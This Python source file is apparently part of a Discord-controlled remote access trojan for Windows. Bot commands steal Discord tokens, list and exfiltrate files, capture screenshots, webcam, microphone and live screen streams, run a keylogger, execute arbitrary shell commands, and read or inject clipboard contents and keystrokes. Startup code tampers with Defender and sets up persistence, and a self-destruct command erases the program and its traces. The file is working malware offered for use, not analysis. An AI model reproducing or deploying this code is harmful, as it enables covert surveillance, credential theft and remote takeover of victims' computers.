    step = 1800 if code else 1900
    for i in range(0, len(text), step):
        part = text[i:i + step]
        await ctx.send(f"```\n{part}\n```" if code else part)


def _actor(g):
    return getattr(g, "me", None) or bot.user


def _can_send(ch, actor):
    try:
        return ch.permissions_for(actor).send_messages
    except Exception:
        return False


async def resolve_guild():
    if not GUILD_ID:
        return None
    g = bot.get_guild(GUILD_ID)
    if g is not None:
        return g
    try:
        g = await bot.fetch_guild(GUILD_ID)
        await g.fetch_channels()
        try:
            await g.fetch_member(bot.user.id)
        except Exception:
            pass
        log(f"guild {GUILD_ID} fetched (was not in cache)")
        return g
    except Exception as e:
        log(f"guild {GUILD_ID} not reachable: {e}")
        return None


async def setup_guild(g):
    name = device_channel_name()
    actor = _actor(g)

    ch = discord.utils.find(lambda c: c.name.lower() == name.lower(),
                            g.text_channels)
    if ch is None:
        try:
            ch = await g.create_text_channel(name, reason=f"{APP_NAME} device channel")
            log(f"[{g.name}] created #{ch.name}")
        except discord.Forbidden as e:
            log(f"[{g.name}] cannot create #{name}: {e} (needs Manage Channels)")
            ch = None
        except discord.HTTPException as e:
            log(f"[{g.name}] create #{name} failed: {e}")
            ch = None

    if ch is not None and not _can_send(ch, actor):
        log(f"[{g.name}] #{ch.name} exists but Send Messages is denied")
        ch = None

    if ch is None:
        ch = discord.utils.find(lambda c: _can_send(c, actor), g.text_channels)
        if ch is None:
            log(f"[{g.name}] no channel we can post in -> skipped")
            return None
        log(f"[{g.name}] falling back to #{ch.name}")

    try:
        await ch.send(await asyncio.to_thread(device_report))
    except Exception as e:
        log(f"[{g.name}] post failed: {e!r}")
        return None

    log(f"[{g.name}] report posted to #{ch.name}")
    _HANDLED.add(g.id)
    return ch


async def setup_all(force=False):
    g = await resolve_guild()
    guilds = [g] if g is not None else list(bot.guilds)
    if not guilds:
        log("no guilds cached -> bot is not in any server")
        return None
    last = None
    for g in guilds:
        if g.id in _HANDLED and not force:
            continue
        last = await setup_guild(g)
    return last


async def on_ready_handler():
    global _REPORTED
    log(f"logged in as {bot.user} ({bot.user.id}); {len(bot.guilds)} guild(s)")
    for g in bot.guilds:
        me = getattr(g, "me", None)
        p = getattr(me, "guild_permissions", None)
        log(f"  guild '{g.name}' ({g.id}) text_channels={len(g.text_channels)} "
            f"manage_channels={getattr(p, 'manage_channels', '?')} "
            f"me={'cached' if me else 'MISSING'}")
    if GUILD_ID and bot.get_guild(GUILD_ID) is None:
        log(f"  !! pinned guild {GUILD_ID} not in cache -> invite the bot there")
    if _REPORTED:
        return
    _REPORTED = True
    try:
        await setup_all()
    except Exception:
        log("channel setup failed:\n" + traceback.format_exc())


async def on_guild_join_handler(guild):
    log(f"joined guild '{guild.name}' ({guild.id})")
    if GUILD_ID and guild.id != GUILD_ID:
        return
    try:
        await setup_guild(guild)
    except Exception:
        log("post-join setup failed:\n" + traceback.format_exc())


async def on_voice_state_update_handler(member, before, after):
    global VOICE_SOURCE
    if bot.user is None or member.id != bot.user.id:
        return
    if before.channel is not None and after.channel is None:
        await asyncio.to_thread(stop_video)
        if VOICE_SOURCE is not None:
            try:
                VOICE_SOURCE.cleanup()
            except Exception:
                pass
            VOICE_SOURCE = None


async def on_command_error_handler(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"`[!]` unknown command `{ctx.invoked_with}` — try `{PREFIX}help`")
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"`[!]` missing argument `{error.param.name}`")
        return
    if isinstance(error, commands.BadArgument):
        await ctx.send(f"`[!]` bad argument: {error}")
        return
    log(f"command error in {ctx.command}: {error!r}")
    try:
        await ctx.send(f"`[!]` {type(error).__name__}: {error}")
    except Exception:
        pass


@command(name="help", aliases=["cmds"])
async def cmd_help(ctx):
    await ctx.send(HELP_TEXT)


@command(name="ping")
async def cmd_ping(ctx):
    await ctx.send(f"`[+]` pong — {APP_NAME} alive on `{host_name()}` "
                   f"(latency {round(bot.latency * 1000)}ms, "
                   f"admin {'yes' if is_admin() else 'no'})")


@command(name="setup", aliases=["channel"])
async def cmd_setup(ctx):
    if ctx.guild is None:
        await ctx.send("`[!]` Run this in a server, not a DM.")
        return
    ch = await setup_guild(ctx.guild)
    if ch is None:
        await ctx.send(f"`[!]` No device channel. Target `{device_channel_name()}`.")
    else:
        await ctx.send(f"`[+]` Device channel ready: {ch.mention}")


@command(name="info")
async def cmd_info(ctx):
    await ctx.send(await asyncio.to_thread(device_report))


@command(name="debug")
async def cmd_debug(ctx):
    vc = bot.voice_clients[0] if bot.voice_clients else None
    conn = getattr(vc, "_connection", None) if vc else None
    running, chars, up = keylog_status()
    have_ff = await asyncio.to_thread(ffmpeg_ok, True)
    cams = await asyncio.to_thread(_cam_sources) if have_ff else []
    s = VIDEO_SENDER
    lines = [
        f"pid         {os.getpid()}",
        f"frozen      {FROZEN} (onedir={_is_onedir()})",
        f"admin       {'yes' if is_admin() else 'no'}",
        f"task        {'present' if await asyncio.to_thread(task_present) else 'absent'}"
        f" (elevated={TASK_ELEVATED})",
        f"install     {INSTALL_FILE}",
        f"run key     {read_persistence()}",
        f"mutex       {'held' if _MUTEX_HANDLE else 'free'}",
        f"hb owner    {hb_owner() or 'none'}",
        f"defender    {defender_state()}",
        f"python      {sys.version.split()[0]}",
        f"discord.py  {discord.__version__}",
        f"video patch {'yes' if _VIDEO_PATCHED else 'NO'}",
        f"guild id    {GUILD_ID or '(all)'}",
        f"guilds      {len(bot.guilds)} ({', '.join(g.name for g in bot.guilds) or 'none'})",
        f"pynacl      {'real' if NACL_REAL else 'shim'}",
        f"davey       {'ok' if DAVEY_OK else 'MISSING'}",
        f"opus        {'ok' if _load_opus() else 'MISSING'}",
        f"ffmpeg      {'ok: ' + FFMPEG if have_ff else 'MISSING'}",
        f"cam srcs    {len(cams)}: {cams[:4] or '-'}",
        f"cam picked  {(await asyncio.to_thread(cam_source, True)) or 'none'}",
        f"video       {s.source if s else 'off'}",
        f"ready strms {len(getattr(conn, '_video_streams', None) or [])}",
        f"keylogger   {'running ' + up if running else 'stopped'} ({chars} chars)",
        f"upload cap  {human_size(upload_limit(ctx))}",
        f"token from  {TOKEN_SOURCE}",
        f"log         {latest_log() or '-'}",
        f"missing     {', '.join(MISSING) or 'none'}",
    ]
    await send_long(ctx, "\n".join(lines), code=True)


@command(name="dtoken", aliases=["dt", "tokens", "dctoken", "tokengrab"])
async def cmd_dtoken(ctx, action: str = ""):
    await ctx.send("`[i]` harvesting tokens ...")
    bots, clients = await asyncio.to_thread(harvest_tokens)

    lines = ["== bot tokens =="]
    if not bots:
        lines.append("(none)")
    for label, tok in bots[:10]:
        ok, who = await asyncio.to_thread(discord_whoami, tok, True)
        lines.append(f"[{'ok ' if ok else 'BAD'}] {label}")
        lines.append(f"      {_mask(tok)}")
        lines.append(f"      -> {who}")

    lines += ["", f"== discord client tokens ({len(clients)} candidate) =="]
    if not clients:
        lines.append("(nothing found - is the Discord app installed + logged in?)")
    else:
        shown = 0
        for src, tok in clients:
            if shown >= 12:
                lines.append(f"... {len(clients) - shown} more (see the file)")
                break
            ok, who = await asyncio.to_thread(discord_whoami, tok, False)
            lines.append(f"[{'ok ' if ok else 'BAD'}] {src}")
            lines.append(f"      {tok}")
            lines.append(f"      -> {who}")
            shown += 1

    await send_long(ctx, "\n".join(lines), code=True)

    out = os.path.join(TMP_DIR, "tokens.txt")
    try:
        with open(out, "w", encoding="utf-8") as f:
            f.write("== bot tokens ==\n")
            for label, tok in bots:
                f.write(f"{label}\n{tok}\n\n")
            f.write("== client tokens ==\n")
            for src, tok in clients:
                f.write(f"{src}\n{tok}\n\n")
        await ctx.send(file=discord.File(out))
    except Exception as e:
        log(f"dtoken file failed: {e}")


@command(name="log")
async def cmd_log(ctx, lines: int = 40):
    p = latest_log()
    if not p:
        await ctx.send("`[!]` no log file yet.")
        return
    try:
        with open(p, encoding="utf-8", errors="ignore") as f:
            data = f.read().splitlines()[-max(1, min(200, int(lines))):]
    except Exception as e:
        await ctx.send(f"`[!]` {e}")
        return
    await send_long(ctx, "\n".join(data), code=True)


@command(name="fileview", aliases=["ls", "dir", "fv"])
async def cmd_fileview(ctx, *, path: str = ""):
    target = resolve_path(path)
    if target is None:
        roots = drive_roots()
        emb = discord.Embed(title="Drives",
                            description="\n".join(f"`{r}`" for r in roots),
                            color=0x2b2d31)
        await ctx.send(embed=emb)
        return

    if not os.path.exists(target):
        await ctx.send(f"`[!]` not found: `{target}`")
        return

    if os.path.isfile(target):
        try:
            st = os.stat(target)
        except OSError as e:
            await ctx.send(f"`[!]` {e}")
            return
        emb = discord.Embed(title="File", color=0x2b2d31)
        emb.add_field(name="Path", value=f"`{target}`", inline=False)
        emb.add_field(name="Size", value=human_size(st.st_size), inline=True)
        emb.add_field(name="Modified",
                      value=time.strftime("%Y-%m-%d %H:%M",
                                          time.localtime(st.st_mtime)),
                      inline=True)
        emb.set_footer(text=f"use {PREFIX}filetransfer to grab it")
        await ctx.send(embed=emb)
        return

    try:
        entries = list(os.scandir(target))
    except Exception as e:
        await ctx.send(f"`[!]` {e}")
        return

    entries.sort(key=lambda e: (not e.is_dir(), e.name.lower()))

    lines, dirs, files = [], 0, 0
    for e in entries:
        try:
            if e.is_dir():
                dirs += 1
                lines.append(f"[dir ] {e.path}\\")
            else:
                files += 1
                lines.append(f"[file] {e.path}  ({human_size(e.stat().st_size)})")
        except OSError:
            lines.append(f"[????] {e.path}")

    if not lines:
        lines = ["(empty)"]

    chunks, cur = [], ""
    for ln in lines:
        if len(cur) + len(ln) + 1 > 3800:
            chunks.append(cur)
            cur = ""
        cur += ln + "\n"
    if cur:
        chunks.append(cur)

    truncated = 0
    if len(chunks) > 10:
        truncated = len(chunks) - 10
        chunks = chunks[:10]

    for i, ch in enumerate(chunks):
        emb = discord.Embed(
            title=(f"{target}" if i == 0 else f"{target}  ({i + 1}/{len(chunks)})"),
            description=f"```\n{ch}\n```",
            color=0x2b2d31)
        if i == 0:
            emb.set_footer(text=f"{dirs} dir(s), {files} file(s)")
        await ctx.send(embed=emb)
    note = f"**`{target}`** — {dirs} dir(s), {files} file(s)"
    if truncated:
        note += f" (truncated, {truncated} more embed(s))"
    await ctx.send(note)


@command(name="filetransfer", aliases=["ft", "getfile", "dl"])
async def cmd_filetransfer(ctx, *, path: str = ""):
    target = resolve_path(path)
    if not target or not os.path.exists(target):
        await ctx.send(f"`[!]` not found: `{path or '(nothing)'}`")
        return

    if os.path.isdir(target):
        await ctx.send(f"`[i]` zipping `{target}` ...")
        try:
            target = await asyncio.to_thread(zip_path, target)
        except Exception as e:
            await ctx.send(f"`[!]` zip failed: {e}")
            return

    try:
        await send_any_file(ctx, target)
    except Exception as e:
        await ctx.send(f"`[!]` transfer failed: {e}")


@command(name="say")
async def cmd_say(ctx, *, text: str = ""):
    if not text:
        await ctx.send(f"`[i]` usage: `{PREFIX}say <text>`")
        return
    await asyncio.to_thread(say_worker, text)
    await ctx.send(f"`[+]` Said {len(text)} char(s).")


@command(name="screenshot", aliases=["shot"])
async def cmd_shot(ctx):
    path = os.path.join(TMP_DIR, "shot.png")
    try:
        await asyncio.to_thread(take_screenshot, path)
    except Exception as e:
        await ctx.send(f"`[!]` screenshot failed: {e}")
        return
    await ctx.send(file=discord.File(path))


@command(name="cam")
async def cmd_cam(ctx):
    path = os.path.join(TMP_DIR, "cam.jpg")
    try:
        how = await asyncio.to_thread(webcam_snapshot, path)
    except Exception as e:
        await ctx.send(f"`[!]` webcam failed: {e}")
        return
    await ctx.send(f"`[+]` Frame via `{how}`.", file=discord.File(path))


@command(name="mic")
async def cmd_mic(ctx, seconds: float = 5.0):
    if sd is None or np is None:
        await ctx.send("`[!]` sounddevice / numpy missing.")
        return
    seconds = max(1.0, min(60.0, float(seconds)))
    path = os.path.join(TMP_DIR, "mic.wav")
    try:
        await asyncio.to_thread(record_audio, path, seconds)
    except Exception as e:
        await ctx.send(f"`[!]` record failed: {e}")
        return
    await ctx.send(file=discord.File(path))


async def _keylog_dump(ctx, text, note):
    if not text:
        await ctx.send(f"`[i]` {note}: buffer is empty.")
        return
    path = os.path.join(TMP_DIR, "keys.txt")

    def _write():
        with open(path, "w", encoding="utf-8", errors="ignore") as f:
            f.write(text)

    try:
        await asyncio.to_thread(_write)
    except Exception as e:
        await ctx.send(f"`[!]` write failed: {e}")
        return
    await ctx.send(f"`[+]` {note}: {len(text)} char(s).", file=discord.File(path))
    if len(text) <= 1800:
        await ctx.send(f"```\n{text}\n```")


@command(name="keylogger", aliases=["keylog", "kl"])
async def cmd_keylogger(ctx, action: str = ""):
    a = (action or "status").strip().lower()
    if a in ("start", "on", "begin"):
        if not await asyncio.to_thread(keylog_start):
            await ctx.send("`[!]` pynput missing -> keylogger unavailable.")
            return
        await ctx.send("`[+]` Keylogger running.")
    elif a in ("send", "flush", "dump", "get"):
        text = await asyncio.to_thread(keylog_take)
        await _keylog_dump(ctx, text, "Keystrokes")
    elif a in ("stop", "off", "end"):
        text = await asyncio.to_thread(keylog_stop)
        await ctx.send("`[+]` Keylogger stopped.")
        await _keylog_dump(ctx, text, "Final keystrokes")
    elif a in ("clear", "reset"):
        await asyncio.to_thread(keylog_take)
        await ctx.send("`[+]` Buffer cleared.")
    else:
        running, chars, up = keylog_status()
        if running:
            await ctx.send(f"`[i]` Keylogger running for {up} — "
                           f"{chars} char(s) buffered.")
        else:
            await ctx.send(f"`[i]` Keylogger stopped — {chars} char(s) buffered.")


@command(name="shell", aliases=["sh"])
async def cmd_shell(ctx, *, command: str = ""):
    if not command:
        await ctx.send(f"`[i]` usage: `{PREFIX}shell <command>`")
        return
    out = await asyncio.to_thread(run_shell, command)
    await send_long(ctx, out, code=True)


@command(name="clip")
async def cmd_clip(ctx):
    if pyperclip is None:
        await ctx.send("`[!]` pyperclip missing.")
        return
    try:
        txt = await asyncio.to_thread(pyperclip.paste)
    except Exception as e:
        await ctx.send(f"`[!]` {e}")
        return
    await send_long(ctx, txt)


@command(name="setclip")
async def cmd_setclip(ctx, *, text: str = ""):
    if pyperclip is None:
        await ctx.send("`[!]` pyperclip missing.")
        return
    try:
        await asyncio.to_thread(pyperclip.copy, text)
    except Exception as e:
        await ctx.send(f"`[!]` {e}")
        return
    await ctx.send("`[+]` Clipboard set.")


@command(name="type")
async def cmd_type(ctx, *, text: str = ""):
    if pynput_keyboard is None:
        await ctx.send("`[!]` pynput missing.")
        return
    if not text:
        await ctx.send(f"`[i]` usage: `{PREFIX}type <text>`")
        return
    await asyncio.to_thread(pynput_keyboard.Controller().type, text)
    await ctx.send("`[+]` Typed.")


# ----------------------------------------------------------------------------
# voice
# ----------------------------------------------------------------------------

def _norm_source(tok, default="both"):
    t = (tok or "").strip().lower()
    if not t:
        return default
    if t in ("camera", "webcam", "cam"):
        return "cam"
    if t in ("screen", "desktop", "monitor", "scr", "display"):
        return "screen"
    if t in ("both", "all"):
        return "both"
    if t in ("off", "none", "no", "stop"):
        return "off"
    return default


def _parse_args(args):
    toks = [t for t in re.split(r"\s+", (args or "").strip().lower()) if t]
    secs, src = None, None
    for t in toks:
        if re.fullmatch(r"\d+(\.\d+)?s?", t):
            secs = float(t.rstrip("s"))
        else:
            src = t
    return secs, src


async def _wait_ffmpeg_then_video(ctx, src):
    global _VIDEO_WAIT_TASK
    try:
        for _ in range(40):
            if await asyncio.to_thread(ffmpeg_ok):
                break
            await asyncio.sleep(5)
        else:
            await ctx.send("`[!]` ffmpeg never showed up -> audio only.")
            return
        if video_running():
            return
        vc = ctx.voice_client
        if vc is None:
            return
        sender = await asyncio.to_thread(start_video, vc, src)
        if sender is None:
            await ctx.send("`[!]` ffmpeg is ready but video would not start.")
            return
        await _report_video(ctx, sender, src)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        log(f"video waiter failed: {e}")
    finally:
        if _VIDEO_WAIT_TASK is asyncio.current_task():
            _VIDEO_WAIT_TASK = None


def _kick_ffmpeg_waiter(ctx, src):
    global _VIDEO_WAIT_TASK
    if _VIDEO_WAIT_TASK is not None and not _VIDEO_WAIT_TASK.done():
        _VIDEO_WAIT_TASK.cancel()
    _VIDEO_WAIT_TASK = asyncio.create_task(_wait_ffmpeg_then_video(ctx, src))


async def _report_video(ctx, sender, src):
    await ctx.send(f"`[+]` Video on: `{sender.source}` — click the bot's tile "
                   f"in the voice channel to watch.")
    await asyncio.sleep(2.5)
    if VIDEO_SENDER is not sender:
        return                      # superseded by a newer command
    if sender.frames:
        await ctx.send(f"`[i]` live: {sender.frames} frame(s), "
                       f"{sender.packets} packet(s), ssrc `{sender.video_ssrc}`.")
    else:
        await ctx.send(f"`[!]` nothing leaving yet — `{PREFIX}debug` and "
                       f"`{PREFIX}log 40` will show why.")


async def _start_or_wait(ctx, src):
    vc = ctx.voice_client
    if vc is None:
        await ctx.send(f"`[!]` Not in a voice channel. Use `{PREFIX}vcjoin` first.")
        return
    if src == "off":
        await asyncio.to_thread(stop_video)
        await ctx.send("`[+]` Video stopped.")
        return
    if not await asyncio.to_thread(ffmpeg_ok):
        await ctx.send("`[i]` ffmpeg not ready yet — will start when it lands.")
        _kick_ffmpeg_waiter(ctx, src)
        return
    sender = await asyncio.to_thread(start_video, vc, src)
    if sender is None:
        await ctx.send("`[!]` Video could not start.")
        return
    await _report_video(ctx, sender, src)


@command(name="vcjoin")
async def cmd_vcjoin(ctx, source: str = ""):
    global VOICE_SOURCE

    if sd is None or np is None:
        await ctx.send("`[!]` sounddevice / numpy missing.")
        return
    if not DAVEY_OK:
        await ctx.send("`[!]` voice needs davey -> `pip install davey`")
        return
    if not _load_opus():
        await ctx.send("`[!]` libopus missing -> voice unavailable")
        return

    target = ctx.author.voice.channel if ctx.author.voice else None
    if target is None:
        await ctx.send("`[!]` You're not in a voice channel.")
        return

    try:
        vc = ctx.voice_client
        if vc is None:
            vc = await target.connect(self_mute=False, self_deaf=False)
        elif vc.channel.id != target.id:
            await vc.move_to(target)
        try:
            await vc.guild.change_voice_state(
                channel=target, self_mute=False, self_deaf=False)
        except Exception:
            pass

        await asyncio.to_thread(stop_video)
        if vc.is_playing():
            vc.stop()
        if VOICE_SOURCE is not None:
            try:
                VOICE_SOURCE.cleanup()
            except Exception:
                pass

        VOICE_SOURCE = MicAudioSource()
        vc.play(VOICE_SOURCE)
    except Exception as e:
        msg = str(e)
        if "davey" in msg.lower():
            await ctx.send("`[!]` voice needs davey -> `pip install davey`")
        elif "opus" in msg.lower():
            await ctx.send("`[!]` libopus could not be loaded.")
        else:
            await ctx.send(f"`[!]` voice failed: {msg}")
        log(f"vcjoin failed: {traceback.format_exc()}")
        return

    src = _norm_source(source, VIDEO_SOURCE)
    await ctx.send(f"`[+]` Joined `{target.name}` and streaming the mic.")
    if src == "off":
        await ctx.send("`[i]` Video off.")
        return
    if not await asyncio.to_thread(ffmpeg_ok):
        await ctx.send("`[i]` ffmpeg not ready yet — audio only for now; "
                       "video will start by itself once it lands.")
        _kick_ffmpeg_waiter(ctx, src)
        return
    sender = await asyncio.to_thread(start_video, vc, src)
    if sender is None:
        await ctx.send("`[!]` Video could not start.")
        return
    await _report_video(ctx, sender, src)


@command(name="record", aliases=["rec", "clip2"])
async def cmd_record(ctx, *, args: str = "10"):
    secs, tok = _parse_args(args)
    if secs is None:
        secs = 10.0
    await _do_record(ctx, secs, _norm_source(tok, "cam"))


async def _do_record(ctx, seconds, source):
    if source == "off":
        source = "cam"
    if not await asyncio.to_thread(ffmpeg_ok):
        await ctx.send("`[!]` ffmpeg missing — it downloads itself on first "
                       "run; check `" + PREFIX + "log 40`.")
        return

    seconds = max(1.0, min(300.0, float(seconds)))
    path = os.path.join(TMP_DIR, f"clip_{int(time.time())}.mp4")

    prev = VIDEO_SENDER.source if VIDEO_SENDER is not None else None
    if prev:
        await asyncio.to_thread(stop_video)

    await ctx.send(f"`[i]` Recording `{source}` for {seconds:g}s ...")
    try:
        await asyncio.to_thread(record_clip, path, seconds, source)
    except Exception as e:
        await ctx.send(f"`[!]` record failed: {e}")
        if prev and ctx.voice_client:
            await asyncio.to_thread(start_video, ctx.voice_client, prev)
        return

    size = os.path.getsize(path) if os.path.isfile(path) else 0
    await ctx.send(f"`[+]` Captured {human_size(size)}.")
    try:
        await send_any_file(ctx, path)
    except Exception as e:
        await ctx.send(f"`[!]` upload failed: {e}")

    if prev and ctx.voice_client:
        try:
            await asyncio.to_thread(start_video, ctx.voice_client, prev)
            await ctx.send(f"`[i]` Live `{prev}` stream resumed.")
        except Exception as e:
            log(f"resume video failed: {e}")


@command(name="vcleave")
async def cmd_vcleave(ctx):
    if ctx.voice_client is None:
        await ctx.send("`[!]` Not in a voice channel.")
        return
    await _voice_teardown()
    await ctx.send("`[+]` Left the voice channel.")


@command(name="self-destruct", aliases=["selfdestruct", "wipe", "nuke"])
async def cmd_selfdestruct(ctx):
    global QUIET
    try:
        await ctx.send("`[+]` Self-destructing — channel goes too.")
    except Exception:
        pass
    QUIET = True
    log("self-destruct requested")
    await asyncio.to_thread(stop_video)
    try:
        await asyncio.to_thread(keylog_stop)
    except Exception:
        pass

    try:
        target = None
        if ctx.guild is not None:
            name = device_channel_name()
            target = discord.utils.find(
                lambda c: c.name.lower() == name.lower(), ctx.guild.text_channels)
        if target is None and isinstance(ctx.channel, discord.TextChannel):
            target = ctx.channel
        if target is not None:
            await asyncio.sleep(0.8)
            await target.delete(reason=f"{APP_NAME} self-destruct")
            log(f"channel deleted: #{target.name}")
    except Exception as e:
        log(f"channel delete failed: {e}")

    try:
        await bot.close()
    except Exception:
        pass
    schedule_self_delete()
    _close_console_window()
    os._exit(0)


ALL_COMMANDS = [
    cmd_help, cmd_ping, cmd_setup, cmd_info, cmd_debug, cmd_dtoken,
    cmd_log, cmd_fileview, cmd_filetransfer, cmd_say, cmd_shot,
    cmd_cam, cmd_mic, cmd_keylogger, cmd_shell, cmd_clip, cmd_setclip, cmd_type,
    cmd_vcjoin, cmd_record, cmd_vcleave, cmd_selfdestruct,
]


def make_bot(with_members=True):
    global bot, _REPORTED, _HANDLED

    intents = discord.Intents.default()
    intents.message_content = True
    intents.members = with_members

    bot = commands.Bot(command_prefix=PREFIX, help_command=None,
                       case_insensitive=True, intents=intents)
    for c in ALL_COMMANDS:
        bot.add_command(c)
    bot.add_listener(on_ready_handler, "on_ready")
    bot.add_listener(on_guild_join_handler, "on_guild_join")
    bot.add_listener(on_voice_state_update_handler, "on_voice_state_update")
    bot.add_listener(on_command_error_handler, "on_command_error")

    _REPORTED = False
    _HANDLED = set()
    return bot


def main():
    global TOKEN_SOURCE

    try:
        os.chdir(INSTALL_DIR)
    except Exception:
        pass

    # let the elevated scheduled-task instance land first if it is coming
    _elevation_grace()

    if not claim_instance():
        return

    hb_write()
    threading.Thread(target=_heartbeat, daemon=True).start()

    harden_defender()
    atexit.register(stop_video)
    install_video_support()

    token, src = find_token()
    if not token:
        path = ensure_token_file()
        log(f"!! no token -> opening {path}")
        try:
            os.startfile(path)
        except Exception as e:
            log(f"could not open Notepad: {e}")
        deadline = time.time() + 1800
        while time.time() < deadline and not token:
            time.sleep(1.5)
            token, src = find_token()
    if not token:
        log("!! still no token -> exiting")
        return
    TOKEN_SOURCE = src
    log(f"token loaded from {src} (admin={is_admin()})")

    logging.basicConfig(level=logging.WARNING)
    threading.Thread(target=_startup_probe, daemon=True).start()

    for with_members in (True, False):
        try:
            log(f"starting bot (members intent: {'on' if with_members else 'off'})")
            make_bot(with_members).run(token, log_handler=None)
            break
        except discord.PrivilegedIntentsRequired:
            log("!! Server Members Intent is off in the portal -> retrying without it")
            continue
        except discord.LoginFailure as e:
            log(f"!! login failed: {e} -> the TOKEN constant looks wrong")
            return
        except Exception:
            log("bot crashed:\n" + traceback.format_exc())
            return
    log("bot stopped")


if __name__ == "__main__":
    main()
